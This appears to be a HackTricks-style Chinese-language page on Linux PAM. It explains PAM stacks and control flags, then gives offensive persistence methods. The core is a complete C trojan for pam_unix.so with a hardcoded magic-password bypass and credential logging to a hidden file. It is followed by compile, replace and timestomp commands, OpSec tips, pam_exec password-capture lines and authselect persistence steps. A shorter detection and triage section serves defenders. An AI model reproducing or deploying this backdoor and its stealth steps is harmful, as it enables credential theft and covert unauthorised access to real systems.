# PAM - Pluggable Authentication Modules

### 基本信息

**PAM (Pluggable Authentication Modules)** 是一种**验证尝试访问计算机服务的用户身份**的安全机制，并根据各种条件控制其访问权限。它类似于数字门卫，确保只有经过授权的用户才能使用特定服务，同时还可能限制其使用，以防止系统过载。

#### 配置文件

- **Solaris** 支持传统的中央配置文件 `/etc/pam.conf`，但当前建议使用 `/etc/pam.d` 下的服务文件。<sup>[[10]](#references)</sup>
- **Linux 系统** 更倾向于使用目录方式，将特定服务的配置存储在 `/etc/pam.d` 中。例如，login 服务的配置文件位于 `/etc/pam.d/login`。<sup>[[1]](#references)</sup>

login 服务的 PAM 配置示例可能如下所示：
```
auth required /lib/security/pam_securetty.so
auth required /lib/security/pam_nologin.so
auth sufficient /lib/security/pam_ldap.so
auth required /lib/security/pam_unix_auth.so try_first_pass
account sufficient /lib/security/pam_ldap.so
account required /lib/security/pam_unix_acct.so
password required /lib/security/pam_cracklib.so
password required /lib/security/pam_ldap.so
password required /lib/security/pam_pwdb.so use_first_pass
session required /lib/security/pam_unix_session.so
```
#### **PAM 管理领域**

这些领域或管理组包括 **auth**、**account**、**password** 和 **session**，分别负责 authentication 和 session management 过程的不同方面：<sup>[[1]](#references)</sup>

- **Auth**：验证用户身份，通常会提示输入密码。
- **Account**：处理账户验证，检查组成员身份或时段限制等条件。
- **Password**：管理密码更新，包括复杂度检查或防止 dictionary attacks。
- **Session**：管理 service session 开始或结束期间的操作，例如挂载目录或设置资源限制。

#### **PAM 模块控制项**

控制项决定模块在成功或失败时的响应，并影响整体 authentication 过程。包括：<sup>[[1]](#references)</sup>

- **Required**：required 模块失败最终会导致失败，但只有在检查完所有后续模块后才会返回失败。
- **Requisite**：失败后立即终止该过程。
- **Sufficient**：如果之前没有 `required` 模块失败，则成功会立即返回，并跳过同一管理组中的剩余模块。
- **Optional**：只有当它是 stack 中唯一模块时，才会导致失败。

#### Offensive Semantics That Matter

分析或修改 PAM 时，**插入规则的位置**决定哪个 stack 会读取它：<sup>[[1]](#references)[[13]](#references)</sup>

- `include` 和 `substack` 会从其他文件中引入规则，因此编辑 `sshd` 可能只影响 SSH，而编辑 `system-auth`、`common-auth` 或其他共享 stack 则可能同时影响多个 service。<sup>[[1]](#references)[[13]](#references)</sup>
- PAM 还支持诸如 `[success=1 default=ignore]` 的方括号控制项。攻击者可以利用这些控制项，在自定义检查成功后 **跳过一个或多个模块**，而不是明显地替换 `pam_unix.so`。<sup>[[1]](#references)</sup>
- `module-path` 可以是**绝对路径**（`/usr/lib/security/pam_custom.so`），也可以是相对于默认 PAM 模块目录的**相对路径**。在现代 Linux 系统中，实际目录通常是 `/lib/security`、`/lib64/security`、`/usr/lib/security`，或类似 `/usr/lib/x86_64-linux-gnu/security` 的 multiarch 路径。<sup>[[1]](#references)[[14]](#references)</sup>

给 operator 的快速提示：在 patch 之前，务必先映射**完整的 service graph**。例如，某些 distro 上的 `sshd -> password-auth -> system-auth`，或其他 distro 上的 `sshd -> system-remote-login -> system-login -> system-auth`，意味着同一个单行 implant 的影响范围可能远超预期。<sup>[[1]](#references)[[13]](#references)</sup>

#### 示例场景

在包含多个 auth 模块的配置中，处理过程会严格按照顺序执行。如果 `pam_securetty` 模块发现登录终端未获授权，则会阻止 root 登录；但由于该模块的状态是 `"required"`，所有模块仍会继续处理。`pam_env` 会设置环境变量，可能改善 user experience。`pam_ldap` 和 `pam_unix` 模块协同对用户进行 authentication，其中 `pam_unix` 会尝试使用之前提供的密码，从而提高 authentication 方法的效率和灵活性。<sup>[[1]](#references)[[13]](#references)[[15]](#references)[[16]](#references)[[17]](#references)</sup>


## 对 PAM 植入后门 – Hooking `pam_unix.so`

在高价值 Linux 环境中，一种经典的 persistence 技巧是**将合法 PAM library 替换为木马化的 drop-in**。在 PAM stack 会加载 `pam_unix.so` 的主机上，SSH 或 console authentication 可以调用其 `pam_sm_authenticate()` entry point；恶意替代品可以捕获 credentials，或实现使用 *magic* password 绕过 authentication。<sup>[[2]](#references)[[11]](#references)</sup>

### 编译速查表
下面的示例使用 Linux-PAM 的 `pam_sm_authenticate()` service entry point，并通过 `pam_get_authtok()` 访问 authentication token。<sup>[[11]](#references)[[12]](#references)</sup>
<details>
<summary>示例 `pam_unix.so` trojan</summary>
```c
#define _GNU_SOURCE
#include <security/pam_modules.h>
#include <security/pam_ext.h>
#include <dlfcn.h>
#include <stdio.h>
#include <fcntl.h>
#include <string.h>
#include <unistd.h>

static void *real_module;
static int (*orig_auth)(pam_handle_t *, int, int, const char **);
static int (*orig_setcred)(pam_handle_t *, int, int, const char **);
static const char *MAGIC = "Sup3rS3cret!";

static int load_original(void) {
if (real_module) return 0;
real_module = dlopen("/lib/security/pam_unix.so.bak", RTLD_NOW | RTLD_LOCAL);
if (!real_module) return -1;
orig_auth = dlsym(real_module, "pam_sm_authenticate");
orig_setcred = dlsym(real_module, "pam_sm_setcred");
return (orig_auth && orig_setcred) ? 0 : -1;
}

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
const char *user = NULL, *pass = NULL;
pam_get_user(pamh, &user, NULL);
pam_get_authtok(pamh, PAM_AUTHTOK, &pass, NULL);

/* Magic pwd → immediate success */
if(pass && strcmp(pass, MAGIC) == 0) return PAM_SUCCESS;

/* Credential harvesting */
if (user && pass) {
int fd = open("/usr/bin/.dbus.log", O_WRONLY|O_APPEND|O_CREAT, 0600);
if (fd >= 0) {
dprintf(fd, "%s:%s\n", user, pass);
close(fd);
}
}

/* Forward to the renamed original module. */
if (load_original() != 0) return PAM_SYSTEM_ERR;
return orig_auth(pamh, flags, argc, argv);
}

PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv) {
if (load_original() != 0) return PAM_SYSTEM_ERR;
return orig_setcred(pamh, flags, argc, argv);
}
```
</details>

Compile 并 stealth-replace（replacement/timestomp 模式由 Unit 42 记录）。将 wrapper 中硬编码的 backup path 以及下面的 commands 都调整为目标系统实际的 PAM module directory：<sup>[[2]](#references)</sup>
```bash
gcc -fPIC -shared -o pam_unix.so trojan_pam.c -ldl -lpam
mv /lib/security/pam_unix.so /lib/security/pam_unix.so.bak
mv pam_unix.so /lib/security/pam_unix.so
chmod 644 /lib/security/pam_unix.so     # keep original perms
touch -r /bin/ls /lib/security/pam_unix.so  # timestomp
```
### OpSec 技巧
1. **Atomic overwrite** – 将完整的 library 写入临时文件，然后将其重命名到目标位置，以避免留下部分写入的 authentication module。
2. 在 Unit 42 对 AuthDoor 的分析中发现了 `/usr/bin/.dbus.log` 这样的路径，因此它也是一个有用的 hunting 指示器。<sup>[[2]](#references)</sup>
3. 保留 PAM stack 所需的 entry points（例如 `pam_sm_authenticate` 和 `pam_sm_setcred`），以确保其他管理操作继续正常工作。<sup>[[11]](#references)[[18]](#references)</sup>

### 检测
对于 package-integrity 检查，RPM 会验证已安装文件的 metadata，`debsums -s` 会报告 checksum 错误，而 triage block 中的 `dpkg -S` 会查询 package ownership；audit watch 语法会记录对路径的写入和属性更改。<sup>[[6]](#references)[[7]](#references)[[8]](#references)[[9]](#references)</sup>
* 将 `pam_unix.so` 的 MD5/SHA256 与 distro package 进行比较。
* 使用 `rpm -V pam` 或 `debsums -s libpam-modules`，无需手动计算 hash 即可发现被替换的 libraries。
* 检查 `/lib/security/` 下是否存在 world-writable 或 ownership 异常的文件。
* `auditd` 规则：`-w /lib/security/pam_unix.so -p wa -k pam-backdoor`。
* 使用 grep 检查 PAM configs 中是否存在意外的 modules：`grep -R "pam_[a-z].*\.so" /etc/pam.d/ | grep -v pam_unix`。

### 快速 triage 命令（post-compromise 或 threat hunting）
```bash
# 1) Spot alien PAM objects
find /{lib,usr/lib,usr/local/lib}{,64}/security -type f -printf '%p %s %M %u:%g %TY-%Tm-%Td\n' | grep -E 'pam_|libselinux'

# 2) Verify package integrity
command -v rpm >/dev/null && rpm -V pam || debsums -s libpam-modules

# 3) Identify non-packaged PAM modules
for f in /{lib,usr/lib,usr/local/lib}{,64}/security/*.so; do
dpkg -S "$f" >/dev/null 2>&1 || echo "UNPACKAGED: $f";
done

# 4) Look for stealth config edits
grep -R "pam_.*\.so" /etc/pam.d/ | grep -E 'plg|selinux|custom|exec'
```
### 滥用 `pam_exec` 实现 persistence
与替换 `pam_unix.so` 不同，更轻量的做法是在 `/etc/pam.d/sshd` 中追加一行 `pam_exec`，这样到达该 PAM 行的调用就会运行一个 helper，同时保持正常的 stack 不变。<sup>[[4]](#references)</sup>
```bash
# Run during the auth phase; expose_authtok sends the token on stdin
auth optional pam_exec.so quiet expose_authtok /usr/local/bin/.ssh_hook.sh
```
`pam_exec` 会通过环境变量接收 PAM 元数据，例如 `PAM_USER`、`PAM_RHOST`、`PAM_SERVICE`、`PAM_TTY` 和 `PAM_TYPE`。启用 `expose_authtok` 后，helper 可在 `auth` 或 `password` 阶段从 `stdin` 读取最多 `PAM_MAX_RESP_SIZE` 字节的密码。如果希望 helper 使用 effective UID 而不是 real UID 运行，请添加 `seteuid`。<sup>[[4]](#references)</sup>

以下是与 `pam_exec` 所记录的模块类型和 `type=` filter 相关的实践说明：<sup>[[4]](#references)</sup>

- `session optional pam_exec.so ...` 更适合用于**登录后操作**，例如重新打开 sockets 或生成 detached daemon。
- `auth optional pam_exec.so quiet expose_authtok ...` 通常用于**凭据捕获**，因为它会在 session 打开之前运行。
- 可以使用 `type=session` 或 `type=auth` 将执行限制在特定 PAM 阶段，从而避免产生嘈杂的重复执行。

### 经受 distro tooling 影响的配置：`authselect`

在使用 `authselect` 的 RHEL 和 Fedora 系统上，直接修改 `/etc/pam.d/system-auth` 或 `/etc/pam.d/password-auth` 等生成文件，可能会被 **`authselect` 覆盖**。为了保持持久化，operators 通常会修改 `/etc/authselect/custom/<profile>/` 下当前使用的 custom profile，然后重新选择它。<sup>[[5]](#references)[[19]](#references)</sup>

拥有 root 权限时的典型工作流：<sup>[[5]](#references)</sup>
```bash
# Inspect the active profile first
authselect current

# If a custom profile already exists, edit its PAM templates instead of system-auth directly
find /etc/authselect/custom -maxdepth 2 -type f \( -name 'system-auth' -o -name 'password-auth' \) -ls

# Regenerate the PAM files after modifying the active custom profile
authselect apply-changes
```
这对攻击和排查都很重要：如果 `/etc/pam.d/system-auth` 包含横幅 `Generated by authselect` 和 `Do not modify this file manually`，那么真正的 persistence 点可能位于 `/etc/authselect/custom/` 下，而不是 `/etc/pam.d/` 中。<sup>[[5]](#references)</sup>

### 近期在野外发现的 tradecraft

近期 2025 年关于 **Plague** Linux backdoor 的报告显示，同一核心思路被进一步发展：恶意 PAM 组件带有一个**静态 bypass password**，并清理与 SSH 相关的环境变量以及 shell history（`HISTFILE=/dev/null`），以减少登录后的 session traces。<sup>[[3]](#references)</sup> 这是一个有用的 hunting pattern，因为 backdoor 逻辑可能存在于 PAM 中，而 stealth artifacts 只会在 authentication 成功**之后**出现。


## References

- [1] [pam.conf(5) / pam.d(5) - Linux-PAM 手册](https://man7.org/linux/man-pages/man5/pam.d.5.html)
- [2] [隐蔽行动者手册：渗透全球电信网络 - Unit 42](https://unit42.paloaltonetworks.com/infiltration-of-global-telecom-networks/)
- [3] [Nextron Systems - Plague：新发现的基于 PAM 的 Linux backdoor](https://www.nextron-systems.com/2025/08/01/plague-a-newly-discovered-pam-based-backdoor-for-linux/)
- [4] [pam_exec(8) - Linux-PAM 手册](https://man7.org/linux/man-pages/man8/pam_exec.8.html)
- [5] [使用 authselect 配置用户 authentication - Red Hat Enterprise Linux](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/10/html/configuring_authentication_and_authorization_in_rhel/configuring-user-authentication-using-authselect)
- [6] [rpm(8) - RPM](https://rpm.org/docs/4.20.x/man/rpm.8)
- [7] [debsums(1) - Debian Manpages](https://manpages.debian.org/unstable/debsums/debsums.1.en.html)
- [8] [auditctl(8) - Linux 手册页](https://man7.org/linux/man-pages/man8/auditctl.8.html)
- [9] [dpkg-query(1) - Debian Manpages](https://manpages.debian.org/testing/dpkg/dpkg-query.1.en.html)
- [10] [管理 Oracle Solaris 11.4 中的 Authentication](https://docs.oracle.com/cd/E37838_01/pdf/E67470.pdf)
- [11] [pam_sm_authenticate(3) - Linux-PAM 手册](https://man7.org/linux/man-pages/man3/pam_sm_authenticate.3.html)
- [12] [pam_get_authtok(3) - Linux-PAM 手册](https://man7.org/linux/man-pages/man3/pam_get_authtok.3.html)
- [13] [系统级 Authentication 指南 - Red Hat Enterprise Linux 7](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html-single/system-level_authentication_guide/index)
- [14] [Ubuntu 软件包文件列表：libpam-modules/noble/amd64](https://packages.ubuntu.com/noble/amd64/libpam-modules/filelist)
- [15] [pam_env(8) - Linux-PAM 手册](https://man7.org/linux/man-pages/man8/pam_env.8.html)
- [16] [pam_unix(8) - Linux-PAM 手册](https://man7.org/linux/man-pages/man8/pam_unix.8.html)
- [17] [pam_ldap(5) - Debian Manpages](https://manpages.debian.org/testing/libpam-ldap/pam_ldap.5.en.html)
- [18] [pam_sm_setcred(3) - Linux-PAM 手册](https://man7.org/linux/man-pages/man3/pam_sm_setcred.3.html)
- [19] [变更：强制使用 Authselect - Fedora Project Wiki](https://fedoraproject.org/wiki/Changes/Make_Authselect_Mandatory)
{{#include ../../banners/hacktricks-training.md}}
